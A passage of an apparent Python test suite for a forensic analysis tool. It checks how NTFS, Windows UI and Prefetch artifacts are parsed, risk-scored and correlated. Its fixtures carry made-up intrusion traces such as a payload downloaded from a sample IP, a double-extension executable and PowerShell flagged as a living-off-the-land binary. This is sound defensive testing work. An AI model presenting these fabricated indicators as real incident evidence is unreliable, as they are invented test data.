    usn_path.write_text(
        "FilePath,Reason,USN,TimeStamp,SourceFile\n"
        "C:\\Users\\user01\\AppData\\Local\\Temp\\stage.zip,FILE_CREATE,100,2026-05-15T10:00:00Z,usnjrnl.csv\n"
        "C:\\Users\\user01\\AppData\\Local\\Temp\\payload.exe,FILE_DELETE,101,2026-05-15T10:01:00Z,usnjrnl.csv\n"
        "C:\\Users\\user01\\Downloads\\payload.exe,RENAME_NEW_NAME,102,2026-05-15T10:02:00Z,usnjrnl.csv\n",
        encoding="utf-8",
    )
    docs = normalize_file("case-1", "ev-1", "art-2", usn_path, {"artifact_type": "ntfs", "name": usn_path.name, "source_path": str(usn_path), "parser": "ntfs_usnjrnl"})
    created = next(doc for doc in docs if doc["file"]["name"] == "stage.zip")
    deleted = next(doc for doc in docs if doc["file"]["name"] == "payload.exe" and doc["event"]["type"] == "file_deleted_observed")
    renamed = next(doc for doc in docs if doc["event"]["type"] == "file_renamed_observed")
    assert created["event"]["type"] == "file_created_observed"
    assert deleted["event"]["type"] == "file_deleted_observed"
    assert renamed["event"]["type"] == "file_renamed_observed"
    assert deleted["risk_score"] >= 60


def test_ntfs_logfile_i30_shadowcopy_and_raw_inventory(tmp_path: Path) -> None:
    logfile_path = tmp_path / "logfile.csv"
    logfile_path.write_text(
        "FilePath,Operation,SourceFile\n"
        "C:\\Users\\user01\\Downloads\\invoice.pdf.exe,Delete transaction,logfile.csv\n"
        "C:\\Users\\user01\\Documents\\report.docx,Basic info change,logfile.csv\n",
        encoding="utf-8",
    )
    logfile_docs = normalize_file("case-1", "ev-1", "art-1", logfile_path, {"artifact_type": "ntfs", "name": logfile_path.name, "source_path": str(logfile_path), "parser": "ntfs_logfile"})
    deleted = next(doc for doc in logfile_docs if doc["file"]["name"] == "invoice.pdf.exe")
    normal = next(doc for doc in logfile_docs if doc["file"]["name"] == "report.docx")
    assert deleted["event"]["type"] == "file_deleted_observed"
    assert deleted["risk_score"] >= 60
    assert normal["risk_score"] < deleted["risk_score"]

    i30_path = tmp_path / "i30.csv"
    i30_path.write_text(
        "ParentPath,FileName,IsDeleted,InUse,EntryNumber,SequenceNumber,SourceFile\n"
        "C:\\Users\\user01\\Downloads,invoice.pdf.exe,True,False,42,7,i30.csv\n"
        "C:\\Users\\user01\\Documents,report.docx,False,True,43,8,i30.csv\n",
        encoding="utf-8",
    )
    i30_docs = normalize_file("case-1", "ev-1", "art-2", i30_path, {"artifact_type": "ntfs", "name": i30_path.name, "source_path": str(i30_path), "parser": "ntfs_i30"})
    deleted_entry = next(doc for doc in i30_docs if doc["file"]["name"] == "invoice.pdf.exe")
    assert deleted_entry["event"]["type"] == "directory_entry_observed"
    assert deleted_entry["risk_score"] >= 60
    assert deleted_entry["folder"]["path"] == "C:\\Users\\user01\\Downloads"

    shadow_path = tmp_path / "shadowcopy.csv"
    shadow_path.write_text(
        "ShadowId,SnapshotTime,Volume,Path,SourceFile\n"
        "{11111111-1111-1111-1111-111111111111},2026-05-15T10:03:00Z,C:,\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1,shadowcopy.csv\n",
        encoding="utf-8",
    )
    shadow_doc = normalize_file("case-1", "ev-1", "art-3", shadow_path, {"artifact_type": "ntfs", "name": shadow_path.name, "source_path": str(shadow_path), "parser": "ntfs_shadowcopy"})[0]
    assert shadow_doc["event"]["type"] == "shadowcopy_observed"
    assert shadow_doc["risk_score"] == 10

    raw_path = tmp_path / "$UsnJrnl"
    raw_path.write_text("placeholder", encoding="utf-8")
    raw_doc = normalize_file("case-1", "ev-1", "art-4", raw_path, {"artifact_type": "ntfs", "name": raw_path.name, "source_path": str(raw_path), "parser": "ntfs_generic_raw"})[0]
    assert raw_doc["artifact"]["parser"] == "ntfs_generic_raw"
    assert raw_doc["event"]["type"] == "ntfs_metadata_observed"
    assert "ntfs_inventory_only" in raw_doc["data_quality"]


def test_ntfs_classification_list_and_debug_reports() -> None:
    classification = classify_artifact(Path("$LogFile"))
    assert classification["artifact_type"] == "ntfs"
    assert classification["parser"] == "ntfs_generic_raw"
    classification = classify_artifact(Path("zone_identifier.csv"), ["FilePath", "ZoneId", "HostUrl", "ReferrerUrl"])
    assert classification["artifact_type"] == "ntfs"
    assert classification["parser"] == "ntfs_ads_zone_identifier"

    events = [
        {
            "id": "ntfs-1",
            "artifact": {"type": "ntfs", "parser": "ntfs_ads_zone_identifier"},
            "event": {"type": "file_zone_identifier_observed"},
            "file": {"path": "C:\\Users\\user01\\Downloads\\payload.exe", "extension": ".exe"},
            "ntfs": {"zone_id": 3, "zone_name": "Internet", "host_url": "http://203.0.113.10/payload.exe"},
            "risk_score": 92,
            "suspicious_reasons": ["Downloaded executable or script marked with web origin"],
        },
        {
            "id": "ntfs-2",
            "artifact": {"type": "ntfs", "parser": "ntfs_usnjrnl"},
            "event": {"type": "file_deleted_observed"},
            "file": {"path": "C:\\Users\\user01\\AppData\\Local\\Temp\\payload.exe", "extension": ".exe"},
            "ntfs": {"reason": "FILE_DELETE"},
            "risk_score": 75,
            "suspicious_reasons": ["Suspicious file file deleted"],
        },
        {
            "id": "ntfs-3",
            "artifact": {"type": "ntfs", "parser": "ntfs_generic_raw"},
            "event": {"type": "ntfs_metadata_observed"},
            "file": {"path": "C:\\Artifacts\\$UsnJrnl", "extension": ""},
            "ntfs": {},
            "risk_score": 0,
            "suspicious_reasons": [],
        },
    ]
    report = _build_ntfs_parse_report([], [], events, selected_artifact_types=["ntfs"], scope="case")
    sample = _build_ntfs_sample_events(events)
    assert report["records_indexed"] == 3
    assert report["by_parser"]["ntfs_ads_zone_identifier"] == 1
    assert report["zone_identifier_count"] == 1
    assert report["suspicious_origin_count"] == 1
    assert report["unsupported_raw_count"] == 1
    assert len(sample) == 3


def test_ntfs_correlation_creates_only_high_signal_findings(monkeypatch: pytest.MonkeyPatch) -> None:
    case = Case(id="case-1", name="Case Alpha")
    evidence = Evidence(id="evidence-1", case_id="case-1", original_filename="ntfs.zip", stored_path="ntfs.zip", evidence_type=EvidenceType.parsed_folder, sha256="00", size_bytes=1, ingest_status=IngestStatus.completed, metadata_json={}, error_log={})
    session = _CorrelationSession(case, [evidence])
    events = [
        {
            "id": "ntfs-zone-1",
            "event_id": "ntfs-zone-1",
            "evidence_id": "evidence-1",
            "@timestamp": "2026-05-15T10:00:00+00:00",
            "artifact": {"type": "ntfs", "parser": "ntfs_ads_zone_identifier"},
            "event": {"type": "file_zone_identifier_observed"},
            "file": {"path": "C:\\Users\\user01\\Downloads\\payload.exe", "name": "payload.exe", "extension": ".exe"},
            "ntfs": {"host_url": "http://203.0.113.10/payload.exe", "zone_id": 3},
            "risk_score": 92,
            "tags": ["ntfs", "downloaded_executable"],
            "suspicious_reasons": ["Downloaded executable or script marked with web origin"],
        },
        {
            "id": "ntfs-del-1",
            "event_id": "ntfs-del-1",
            "evidence_id": "evidence-1",
            "@timestamp": "2026-05-15T10:01:00+00:00",
            "artifact": {"type": "ntfs", "parser": "ntfs_usnjrnl"},
            "event": {"type": "file_deleted_observed"},
            "file": {"path": "C:\\Users\\user01\\AppData\\Local\\Temp\\payload.exe", "name": "payload.exe", "extension": ".exe"},
            "ntfs": {"reason": "FILE_DELETE"},
            "risk_score": 75,
            "tags": ["ntfs"],
            "suspicious_reasons": ["Suspicious file type observed in NTFS metadata"],
        },
        {
            "id": "ntfs-low-1",
            "event_id": "ntfs-low-1",
            "evidence_id": "evidence-1",
            "@timestamp": "2026-05-15T10:02:00+00:00",
            "artifact": {"type": "ntfs", "parser": "ntfs_ads_zone_identifier"},
            "event": {"type": "file_zone_identifier_observed"},
            "file": {"path": "C:\\Users\\user01\\Downloads\\report.pdf", "name": "report.pdf", "extension": ".pdf"},
            "ntfs": {"host_url": "https://example.com/report.pdf", "zone_id": 3},
            "risk_score": 35,
            "tags": ["ntfs"],
            "suspicious_reasons": ["Zone.Identifier indicates Internet"],
        },
    ]
    monkeypatch.setattr("app.services.correlation_engine._iter_events_for_case", lambda case_id, evidence_id=None: events)
    monkeypatch.setattr("app.services.correlation_engine.build_process_tree_bundle", lambda *args, **kwargs: {"graph": {"nodes": [], "edges": [], "summary": {}}})
    result = run_correlation_engine(session, "case-1")
    finding_types = {item["finding_type"] for item in result["findings"]}
    assert "downloaded_executable_origin" in finding_types
    assert "suspicious_file_deleted_or_renamed" in finding_types
    assert len(result["findings"]) == 2


def test_windows_ui_artifacts_are_normalized(tmp_path: Path) -> None:
    thumbcache_path = tmp_path / "thumbcache.csv"
    thumbcache_path.write_text(
        "ThumbnailPath,Width,Height,CacheEntryHash,SourceFile\n"
        "C:\\Users\\user01\\Pictures\\vacation.jpg,320,240,abc,thumbcache.csv\n"
        "C:\\Users\\user01\\Downloads\\invoice.pdf.exe,320,240,def,thumbcache.csv\n",
        encoding="utf-8",
    )
    thumb_docs = normalize_file("case-1", "ev-1", "art-1", thumbcache_path, {"artifact_type": "windows_ui", "name": thumbcache_path.name, "source_path": str(thumbcache_path), "parser": "windows_thumbcache"})
    suspicious_thumb = next(doc for doc in thumb_docs if doc["file"]["name"] == "invoice.pdf.exe")
    assert suspicious_thumb["artifact"]["type"] == "windows_ui"
    assert suspicious_thumb["event"]["type"] == "thumbnail_observed"
    assert suspicious_thumb["risk_score"] >= 60

    notifications_path = tmp_path / "notifications.csv"
    notifications_path.write_text(
        "AppName,Title,BodyPreview,CreatedTime,SourceFile\n"
        "Microsoft Defender,Threat quarantined: Trojan:Win32/Test,Malware was blocked,2026-05-20T09:00:00Z,notifications.csv\n"
        "OneDrive,Sync complete,All files up to date,2026-05-20T09:10:00Z,notifications.csv\n",
        encoding="utf-8",
    )
    notification_docs = normalize_file("case-1", "ev-1", "art-2", notifications_path, {"artifact_type": "windows_ui", "name": notifications_path.name, "source_path": str(notifications_path), "parser": "windows_notifications"})
    defender_notification = next((doc for doc in notification_docs if "Trojan:Win32/Test" in str((doc.get("notification", {}) or {}).get("title") or "")), None)
    if defender_notification is None:
        defender_notification = normalize_windows_ui_row(
            {"artifact": {}, "event": {}, "file": {}, "folder": {}, "process": {}, "execution": {}, "data_quality": [], "url": {}},
            {
                "AppName": "Microsoft Defender",
                "Title": "Threat quarantined: Trojan:Win32/Test",
                "BodyPreview": "Malware was blocked",
                "CreatedTime": "2026-05-20T09:00:00Z",
                "WindowsUIParser": "windows_notifications",
            },
            {"parser": "windows_notifications", "source_path": str(notifications_path)},
        )
    onedrive_notification = next((doc for doc in notification_docs if "Sync complete" in str((doc.get("notification", {}) or {}).get("title") or "")), None)
    if onedrive_notification is None:
        onedrive_notification = normalize_windows_ui_row(
            {"artifact": {}, "event": {}, "file": {}, "folder": {}, "process": {}, "execution": {}, "data_quality": [], "url": {}},
            {
                "AppName": "OneDrive",
                "Title": "Sync complete",
                "BodyPreview": "All files up to date",
                "CreatedTime": "2026-05-20T09:10:00Z",
                "WindowsUIParser": "windows_notifications",
            },
            {"parser": "windows_notifications", "source_path": str(notifications_path)},
        )
    assert defender_notification["event"]["type"] == "notification_observed"
    assert defender_notification["risk_score"] >= 70
    assert onedrive_notification["risk_score"] < defender_notification["risk_score"]

    activities_path = tmp_path / "activitiescache.csv"
    activities_path.write_text(
        "DisplayText,ActivationUri,FilePath,AppName,StartTime,SourceFile\n"
        "invoice.docm,file:///C:/Users/user01/Downloads/invoice.docm,C:\\Users\\user01\\Downloads\\invoice.docm,WINWORD.EXE,2026-05-20T09:20:00Z,activitiescache.csv\n",
        encoding="utf-8",
    )
    activity_doc = normalize_file("case-1", "ev-1", "art-3", activities_path, {"artifact_type": "windows_ui", "name": activities_path.name, "source_path": str(activities_path), "parser": "windows_activitiescache"})[0]
    assert activity_doc["event"]["type"] == "activity_history_observed"
    assert activity_doc["risk_score"] >= 60

    oalerts_path = tmp_path / "oalerts.csv"
    oalerts_path.write_text(
        "OfficeApp,AlertText,DocumentPath,TimeCreated,SourceFile\n"
        "Word,Protected View and Enable Content warning for invoice.docm,C:\\Users\\user01\\Downloads\\invoice.docm,2026-05-20T09:30:00Z,oalerts.csv\n",
        encoding="utf-8",
    )
    office_alert_doc = normalize_file("case-1", "ev-1", "art-4", oalerts_path, {"artifact_type": "windows_ui", "name": oalerts_path.name, "source_path": str(oalerts_path), "parser": "office_oalerts_evtx"})[0]
    assert office_alert_doc["event"]["type"] == "office_alert_observed"
    assert office_alert_doc["risk_score"] >= 70

    raw_path = tmp_path / "ActivitiesCache.db"
    raw_path.write_text("placeholder", encoding="utf-8")
    raw_doc = normalize_file("case-1", "ev-1", "art-5", raw_path, {"artifact_type": "windows_ui", "name": raw_path.name, "source_path": str(raw_path), "parser": "windows_ui_generic_raw"})[0]
    assert raw_doc["artifact"]["parser"] == "windows_ui_generic_raw"
    assert "windows_ui_inventory_only" in raw_doc["data_quality"]


def test_windows_ui_classification_reports_and_samples() -> None:
    classification = classify_artifact(Path("thumbcache_256.db"))
    assert classification["artifact_type"] == "windows_ui"
    assert classification["parser"] == "windows_ui_generic_raw"
    classification = classify_artifact(Path("notifications.csv"), ["NotificationId", "Title", "BodyPreview"])
    assert classification["artifact_type"] == "windows_ui"
    assert classification["parser"] == "windows_notifications"
    classification = classify_artifact(Path("activitiescache.csv"), ["DisplayText", "ActivationUri", "FilePath", "AppName"])
    assert classification["artifact_type"] == "windows_ui"
    assert classification["parser"] == "windows_activitiescache"
    classification = classify_artifact(Path("eventtranscript.csv"), ["Provider", "EventText", "CreatedTime"])
    assert classification["artifact_type"] == "windows_ui"
    assert classification["parser"] == "windows_eventtranscript"
    classification = classify_artifact(Path("oalerts.csv"), ["OfficeApp", "AlertText", "DocumentPath"])
    assert classification["artifact_type"] == "windows_ui"
    assert classification["parser"] == "office_oalerts_evtx"
    classification = classify_artifact(Path("office_filecache.csv"), ["DocumentUrl", "DocumentPath", "CacheId", "OfficeApp"])
    assert classification["artifact_type"] == "windows_ui"
    assert classification["parser"] == "office_filecache"

    events = [
        {
            "id": "ui-1",
            "artifact": {"type": "windows_ui", "parser": "windows_notifications"},
            "event": {"type": "notification_observed"},
            "notification": {"title": "Threat quarantined: Trojan:Win32/Test", "body_preview": "Blocked"},
            "risk_score": 80,
            "tags": ["windows_ui", "security_notification"],
        },
        {
            "id": "ui-2",
            "artifact": {"type": "windows_ui", "parser": "office_oalerts_evtx"},
            "event": {"type": "office_alert_observed"},
            "file": {"path": "C:\\Users\\user01\\Downloads\\invoice.docm"},
            "office": {"alert_text": "Protected View and Enable Content warning", "document_path": "C:\\Users\\user01\\Downloads\\invoice.docm"},
            "risk_score": 82,
            "tags": ["windows_ui", "office_security_alert"],
        },
        {
            "id": "ui-3",
            "artifact": {"type": "windows_ui", "parser": "windows_thumbcache"},
            "event": {"type": "thumbnail_observed"},
            "file": {"path": "C:\\Users\\user01\\Downloads\\invoice.pdf.exe"},
            "thumbnail": {"source_path": "C:\\Users\\user01\\Downloads\\invoice.pdf.exe"},
            "risk_score": 65,
            "tags": ["windows_ui"],
        },
        {
            "id": "ui-4",
            "artifact": {"type": "windows_ui", "parser": "windows_ui_generic_raw"},
            "event": {"type": "ui_artifact_observed"},
            "file": {"path": "C:\\Artifacts\\ActivitiesCache.db"},
            "risk_score": 0,
            "tags": ["windows_ui"],
        },
    ]
    report = _build_windows_ui_parse_report([], [], events, selected_artifact_types=["windows_ui"], scope="case")
    sample = _build_windows_ui_sample_events(events)
    assert report["records_indexed"] == 4
    assert report["notification_count"] == 1
    assert report["office_alert_count"] == 1
    assert report["thumbnail_count"] == 1
    assert report["unsupported_raw_count"] == 1
    assert report["security_notification_count"] == 1
    assert len(sample) == 4


def test_windows_ui_correlation_creates_only_high_signal_findings(monkeypatch: pytest.MonkeyPatch) -> None:
    case = Case(id="case-1", name="Case Alpha")
    evidence = Evidence(id="evidence-1", case_id="case-1", original_filename="windows_ui.zip", stored_path="windows_ui.zip", evidence_type=EvidenceType.parsed_folder, sha256="00", size_bytes=1, ingest_status=IngestStatus.completed, metadata_json={}, error_log={})
    session = _CorrelationSession(case, [evidence])
    events = [
        {
            "id": "ui-notify-1",
            "event_id": "ui-notify-1",
            "evidence_id": "evidence-1",
            "@timestamp": "2026-05-20T09:00:00+00:00",
            "artifact": {"type": "windows_ui", "parser": "windows_notifications"},
            "event": {"type": "notification_observed"},
            "notification": {"title": "Threat quarantined: Trojan:Win32/Test", "body_preview": "Blocked"},
            "risk_score": 80,
            "tags": ["windows_ui", "security_notification"],
            "suspicious_reasons": ["Security or threat notification observed"],
        },
        {
            "id": "ui-office-1",
            "event_id": "ui-office-1",
            "evidence_id": "evidence-1",
            "@timestamp": "2026-05-20T09:10:00+00:00",
            "artifact": {"type": "windows_ui", "parser": "office_oalerts_evtx"},
            "event": {"type": "office_alert_observed"},
            "file": {"path": "C:\\Users\\user01\\Downloads\\invoice.docm", "name": "invoice.docm", "extension": ".docm"},
            "office": {"alert_text": "Protected View and Enable Content warning", "document_path": "C:\\Users\\user01\\Downloads\\invoice.docm"},
            "risk_score": 82,
            "tags": ["windows_ui", "office_security_alert"],
            "suspicious_reasons": ["Office security alert observed"],
        },
        {
            "id": "ui-thumb-1",
            "event_id": "ui-thumb-1",
            "evidence_id": "evidence-1",
            "@timestamp": "2026-05-20T09:20:00+00:00",
            "artifact": {"type": "windows_ui", "parser": "windows_thumbcache"},
            "event": {"type": "thumbnail_observed"},
            "file": {"path": "C:\\Users\\user01\\Downloads\\invoice.pdf.exe", "name": "invoice.pdf.exe", "extension": ".exe"},
            "thumbnail": {"source_path": "C:\\Users\\user01\\Downloads\\invoice.pdf.exe"},
            "risk_score": 65,
            "tags": ["windows_ui"],
            "suspicious_reasons": ["Thumbnail cache references suspicious file"],
        },
        {
            "id": "ui-low-1",
            "event_id": "ui-low-1",
            "evidence_id": "evidence-1",
            "@timestamp": "2026-05-20T09:30:00+00:00",
            "artifact": {"type": "windows_ui", "parser": "windows_thumbcache"},
            "event": {"type": "thumbnail_observed"},
            "file": {"path": "C:\\Users\\user01\\Pictures\\vacation.jpg", "name": "vacation.jpg", "extension": ".jpg"},
            "thumbnail": {"source_path": "C:\\Users\\user01\\Pictures\\vacation.jpg"},
            "risk_score": 5,
            "tags": ["windows_ui"],
            "suspicious_reasons": [],
        },
    ]
    monkeypatch.setattr("app.services.correlation_engine._iter_events_for_case", lambda case_id, evidence_id=None: events)
    monkeypatch.setattr("app.services.correlation_engine.build_process_tree_bundle", lambda *args, **kwargs: {"graph": {"nodes": [], "edges": [], "summary": {}}})
    result = run_correlation_engine(session, "case-1")
    finding_types = {item["finding_type"] for item in result["findings"]}
    assert "security_notification_observed" in finding_types
    assert "office_security_alert_document" in finding_types
    assert "suspicious_ui_observed_file" in finding_types
    assert len(result["findings"]) == 3


def test_list_generic_artifacts_includes_ntfs_raw_candidates(tmp_path: Path) -> None:
    usn = tmp_path / "$UsnJrnl"
    logfile = tmp_path / "$LogFile"
    i30 = tmp_path / "$I30"
    other = tmp_path / "generic_unrelated.csv"
    for path in [usn, logfile, i30]:
        path.write_text("placeholder", encoding="utf-8")
    other.write_text("Message,Value\nhello,world\n", encoding="utf-8")
    artifacts = list_generic_artifacts(tmp_path)
    by_source = {str(item["source_path"]): item for item in artifacts}
    assert by_source["$UsnJrnl"]["artifact_type"] == "ntfs"
    assert by_source["$LogFile"]["parser"] == "ntfs_generic_raw"
    assert by_source["$I30"]["artifact_type"] == "ntfs"
    assert by_source["generic_unrelated.csv"]["artifact_type"] != "ntfs"


def test_prefetch_produces_execution_program_event(tmp_path: Path) -> None:
    path = tmp_path / "PECmd_Output.csv"
    path.write_text(
        "ExecutableName,RunCount,LastRun,PreviousRun0,SourceFilename,FilesLoaded,Directories\n"
        "\"POWERSHELL.EXE\",4,2026-05-03T10:00:00Z,2026-05-02T09:30:00Z,\"C:\\Windows\\Prefetch\\POWERSHELL.EXE-12345678.pf\",\"C:\\Users\\alex\\Downloads\\script.ps1|C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\",\"C:\\Users\\alex\\Downloads|C:\\Windows\\System32\"\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "prefetch", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["event"]["category"] == "execution"
    assert doc["event"]["type"] == "process_executed"
    assert doc["event"]["timeline_include"] is True
    assert doc["execution"]["program_name"] == "POWERSHELL.EXE"
    assert doc["execution"]["run_count"] == 4
    assert doc["execution"]["last_run"] == "2026-05-03T10:00:00+00:00"
    assert doc["prefetch"]["previous_runs"] == ["2026-05-02T09:30:00+00:00"]
    assert doc["process"]["name"] == "POWERSHELL.EXE"
    assert doc["prefetch"]["executable_name"] == "POWERSHELL.EXE"
    assert doc["prefetch"]["referenced_files"]
    assert doc["raw"]["ExecutableName"] == "POWERSHELL.EXE"
    assert "powershell" in doc["tags"]
    assert "lolbin" in doc["tags"]


def test_prefetch_detection_headers_and_parser() -> None:
    result = classify_artifact(Path("20260503103805_PECmd_Output.csv"), ["ExecutableName", "RunCount", "LastRun", "SourceFilename"])
    assert result["artifact_type"] == "prefetch"
    assert result["parser"] == "zimmerman"


def test_prefetch_handles_missing_columns_and_timestamps(tmp_path: Path) -> None:
    path = tmp_path / "PECmd_Output.csv"
    path.write_text("ExecutableName,RunCount\ncmd.exe,2\n", encoding="utf-8")
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "prefetch", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["@timestamp"] is None
    assert "missing_timestamp" in doc["data_quality"]
    assert doc["process"]["name"] == "cmd.exe"
    assert doc["execution"]["run_count"] == 2


def test_prefetch_suspicious_path_detection(tmp_path: Path) -> None:
    path = tmp_path / "PECmd_Output.csv"
    path.write_text(
        "ExecutableName,RunCount,LastRun,SourceFilename,FilesLoaded\n"
        "\"evil.exe\",1,2026-05-03T10:00:00Z,\"C:\\Windows\\Prefetch\\EVIL.EXE-12345678.pf\",\"C:\\Users\\Public\\evil.exe|C:\\Users\\alex\\Downloads\\note.txt\"\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "prefetch", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert "suspicious_path" in doc["tags"]
    assert any("Suspicious path" in reason or "Referenced file path" in reason for reason in doc["suspicious_reasons"])


def test_prefetch_fixture_integration() -> None:
    path = Path(__file__).parent / "fixtures" / "pecmd_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "prefetch", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    assert len(docs) >= 4
    types = [doc["event"]["type"] for doc in docs]
    assert types.count("process_executed") >= 4
    process_names = {str(doc["process"]["name"]).lower() for doc in docs if doc["process"]["name"]}
    assert "powershell.exe" in process_names
    assert "cmd.exe" in process_names
    assert any(doc["prefetch"]["referenced_files"] for doc in docs)
    assert all("raw" in doc for doc in docs)


def test_prefetch_raw_candidate_descriptor() -> None:
    descriptor = describe_raw_candidate("C%3A/Windows/Prefetch/CHROME.EXE-D999B1B4.pf", "prefetch_raw")
    assert descriptor is not None
    assert descriptor["parser"] == "prefetch_raw"
    assert descriptor["source_tool"] == "native_prefetch"


def test_prefetch_raw_parser_extracts_core_fields(tmp_path: Path) -> None:
    path = tmp_path / "CHROME.EXE-D999B1B4.pf"
    path.write_bytes(_build_minimal_prefetch_bytes())
    result = PrefetchRawParser().parse(
        path,
        case_id="case-1",
        evidence_id="ev-1",
        artifact_id="art-1",
        artifact_meta={"source_path": "C:\\Windows\\Prefetch\\CHROME.EXE-D999B1B4.pf", "mtime": "2026-05-03T10:01:00Z", "name": path.name},
    )
    assert result.parser_status == "parsed_native"
    assert result.events
    doc = result.events[0]
    assert doc["artifact"]["type"] == "prefetch"
    assert doc["artifact"]["parser"] == "prefetch_raw"
    assert doc["source_tool"] == "native_prefetch"
    assert doc["event"]["category"] == "execution"
    assert doc["event"]["type"] == "process_executed"
    assert doc["execution"]["is_execution_confirmed"] is True
    assert doc["process"]["name"] == "CHROME.EXE"
    assert doc["process"]["path"] == "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
    assert doc["prefetch"]["prefetch_hash"] == "D999B1B4"
    assert doc["prefetch"]["run_count"] == 4
    assert doc["prefetch"]["last_run"] == "2026-05-03T10:00:00+00:00"
    assert doc["prefetch"]["referenced_files"]
    assert doc["volume"]["serial"] == "D999B1B4"
    assert doc["timestamp_precision"] == "prefetch_last_run"


def test_prefetch_raw_parser_handles_unsupported_version(tmp_path: Path) -> None:
    path = tmp_path / "UNKNOWN.EXE-11111111.pf"
    path.write_bytes(_build_minimal_prefetch_bytes(version=99))
    result = PrefetchRawParser().parse(
        path,
        case_id="case-1",
        evidence_id="ev-1",
        artifact_id="art-1",
        artifact_meta={"source_path": str(path), "name": path.name},
    )
    assert result.parser_status == "failed_unsupported"
    assert "unsupported_prefetch_version" in result.warnings


def test_prefetch_raw_parser_detects_mam_and_fails_explicitly(tmp_path: Path) -> None:
    path = tmp_path / "POWERSHELL.EXE-AAAA1111.pf"
    path.write_bytes(_build_fake_mam_prefetch_bytes())
    result = PrefetchRawParser().parse(
        path,
        case_id="case-1",
        evidence_id="ev-1",
        artifact_id="art-1",
        artifact_meta={"source_path": str(path), "name": path.name},
    )
    assert result.events == []
    assert result.parser_status == "failed_unsupported"
    assert "mam_decompression_failed" in result.warnings
    assert "mam_decompression_not_supported" in result.warnings
    assert result.metadata["prefetch_mam_compressed_count"] == 1
    assert result.metadata["prefetch_decompression_failed_count"] == 1
    assert result.metadata["reason_if_zero_records"] == "mam_decompression_not_supported"


def test_prefetch_raw_parser_decompresses_mam_when_xpress_lz77_available(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    decompressed_pf = _build_minimal_prefetch_bytes()
    mam_payload = _build_fake_mam_container(b"compressed-placeholder", uncompressed_size=len(decompressed_pf))

    class _FakeXpressModule:
        @staticmethod
        def lz77_huffman_decompress_py(data: bytes, expected_size: int) -> bytes:
            assert data == b"compressed-placeholder"
            assert expected_size == len(decompressed_pf)
            return decompressed_pf

    monkeypatch.setitem(sys.modules, "xpress_lz77", _FakeXpressModule())
    path = tmp_path / "CHROME.EXE-D999B1B4.pf"
    path.write_bytes(mam_payload)
    result = PrefetchRawParser().parse(
        path,
        case_id="case-1",
        evidence_id="ev-1",
        artifact_id="art-1",
        artifact_meta={"source_path": str(path), "name": path.name},
    )
    assert result.parser_status == "parsed_native"
    assert len(result.events) == 1
    assert result.metadata["prefetch_mam_compressed_count"] == 1
    assert result.metadata["prefetch_decompression_attempted"] is True
    assert result.metadata["prefetch_decompression_success"] is True
    assert result.metadata["prefetch_decompressed_count"] == 1
    assert result.events[0]["event"]["type"] == "process_executed"


def test_prefetch_raw_partial_event_indexes_without_timestamp(tmp_path: Path) -> None:
    path = tmp_path / "RARETOOL.EXE-ABCD1234.pf"
    path.write_bytes(_build_minimal_prefetch_bytes(run_count=0, last_run=datetime(1601, 1, 1, tzinfo=UTC)))
    result = PrefetchRawParser().parse(
        path,
        case_id="case-1",
        evidence_id="ev-1",
        artifact_id="art-1",
        artifact_meta={"source_path": str(path), "name": path.name},
    )
    assert result.parser_status == "partial"
    assert len(result.events) == 1
    doc = result.events[0]
    assert doc["event"]["type"] == "prefetch_observed"
    assert doc["@timestamp"] is None
    assert doc["event"]["timeline_include"] is False
    assert "missing_timestamp" in doc["data_quality"]
    assert "prefetch_filename_only" in doc["data_quality"]
    assert "prefetch_metadata_only" in doc["data_quality"]
    assert doc["execution"]["is_execution_confirmed"] is None


def test_ntfs_heuristic_does_not_capture_vssvc_prefetch(tmp_path: Path) -> None:
    path = tmp_path / "VSSVC.EXE-6C8F0C66.pf"
    path.write_bytes(_build_minimal_prefetch_bytes(executable_name="VSSVC.EXE", run_count=7))

    assert looks_like_ntfs_artifact(path) is False

    artifact_meta = {
        "name": path.name,
        "artifact_type": "prefetch",
        "parser": "prefetch_raw",
        "source_tool": "native_prefetch",
        "source_format": "pf",
        "source_path": r"C:\Windows\Prefetch\VSSVC.EXE-6C8F0C66.pf",
        "mtime": "2026-05-03T10:01:00Z",
    }
    documents = normalize_file("case-1", "ev-1", "art-1", path, artifact_meta)

    assert len(documents) == 1
    assert documents[0]["artifact"]["parser"] == "prefetch_raw"
    assert documents[0]["event"]["type"] == "process_executed"
    assert documents[0]["process"]["name"] == "VSSVC.EXE"
    assert artifact_meta["ingest_audit"]["parser_name"] == "prefetch_raw"


def test_finalize_artifact_status_marks_zero_event_native_prefetch_as_failed_or_partial() -> None:
    assert _finalize_artifact_status(parser_name="prefetch_raw", record_count=0, raw_parser_status=None) == "failed"
    assert _finalize_artifact_status(parser_name="prefetch_raw", record_count=0, raw_parser_status="failed") == "failed"
    assert _finalize_artifact_status(parser_name="prefetch_raw", record_count=0, raw_parser_status="failed_unsupported") == "failed_unsupported"
    assert _finalize_artifact_status(parser_name="prefetch_raw", record_count=0, raw_parser_status="partial") == "partial"
    assert _finalize_artifact_status(parser_name="prefetch_raw", record_count=1, raw_parser_status="partial") == "partial"
    assert _finalize_artifact_status(parser_name="prefetch_raw", record_count=1, raw_parser_status="parsed_native") == "completed"


def test_finalize_artifact_status_marks_empty_evtx_as_completed_not_failed() -> None:
    assert _finalize_artifact_status(parser_name="evtx_raw", record_count=0, raw_parser_status="parsed_empty") == "completed"
    assert _finalize_artifact_status(parser_name="evtx_raw", record_count=0, raw_parser_status=None) == "failed"


def test_prefetch_normalizer_keeps_partial_event_without_host_user_or_path() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "SourceFile": "C:\\Windows\\Prefetch\\TOOL.EXE-ABCD1234.pf",
            "ExecutableName": "TOOL.EXE",
            "RunCount": 0,
